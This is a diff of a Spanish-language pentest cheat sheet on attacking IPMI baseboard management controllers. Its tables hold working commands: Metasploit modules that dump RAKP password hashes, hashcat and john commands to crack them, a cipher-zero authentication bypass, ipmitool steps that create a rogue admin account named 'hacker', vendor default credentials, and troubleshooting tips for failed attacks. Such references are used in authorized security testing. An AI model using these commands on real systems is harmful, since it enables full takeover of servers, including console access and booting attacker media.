@@ -23,19 +23,19 @@ tags:
 | `nmap -sU -p623 --script "ipmi-version,ipmi-cipher-zero" HOST` | Versión de IPMI y si acepta cipher 0 |
 | `msf> use auxiliary/scanner/ipmi/ipmi_version` | Ídem por Metasploit |
 
-## Volcado de hash RAKP (el clásico)
 
+## Volcado de hash RAKP (el clásico)
 Fallo de diseño de IPMI 2.0 (CVE-2013-4786): durante la autenticación, el BMC **le manda a cualquier cliente** un hash HMAC del password del usuario. Se pide y se crackea offline — no hace falta credencial previa.
 
 | Paso | Comando |
 |---|---|
 | Volcar los hashes | `msf> use auxiliary/scanner/ipmi/ipmi_dumphashes` |
-| Crackear | `hashcat -m 7300 hashes.txt wordlist.txt` |
+| Crackear (hashcat) | `hashcat -m 7300 hashes.txt wordlist.txt` |
+| Crackear (john) | `john --format=rakp --wordlist=wordlist.txt hashes.txt` |
 
 El modo `7300` de hashcat es exactamente "IPMI2 RAKP HMAC-SHA1". Con un usuario válido (`ADMIN`, `root`) y una contraseña débil, es acceso total al BMC.
 
 ## Cipher Zero — bypass de autenticación
-
 Algunos BMC aceptan el "cipher suite 0", que **no valida la contraseña**: con un usuario válido se entra sin saberla.
 
 | Paso | Comando |
@@ -43,6 +43,7 @@ Algunos BMC aceptan el "cipher suite 0", que **no valida la contraseña**: con u
 | Comprobar | `msf> use auxiliary/scanner/ipmi/ipmi_cipher_zero` |
 | Usar (listar usuarios) | `ipmitool -I lanplus -C 0 -H HOST -U ADMIN -P '' user list` |
 | Crear un admin | `ipmitool -I lanplus -C 0 -H HOST -U ADMIN -P '' user set name 5 hacker` … `user set password 5 P4ss` … `channel setaccess 1 5 ipmi=on privilege=4` |
+
 
 ## Credenciales por defecto
 
@@ -54,6 +55,7 @@ Los BMC salen de fábrica con credenciales conocidas — probar siempre.
 | Dell iDRAC | `root` / `calvin` |
 | HP iLO | `Administrator` / (8 chars aleatorios en la etiqueta física) |
 | IBM IMM | `USERID` / `PASSW0RD` (con cero) |
+
 
 ## Post-acceso (ipmitool)
 
@@ -73,3 +75,4 @@ El BMC es control físico total: consola KVM, montar **virtual media** y bootear
 | RAKP sin hashes | usuario inexistente | probar `ADMIN`, `root`, `Administrator` |
 | cipher 0 rechazado | el BMC lo deshabilitó (parcheado) | pasar a RAKP + crack, o defaults |
 | `Error: Unable to establish LAN session` | falta `-I lanplus` o versión distinta | forzar `-I lanplus` (IPMI 2.0) |
+
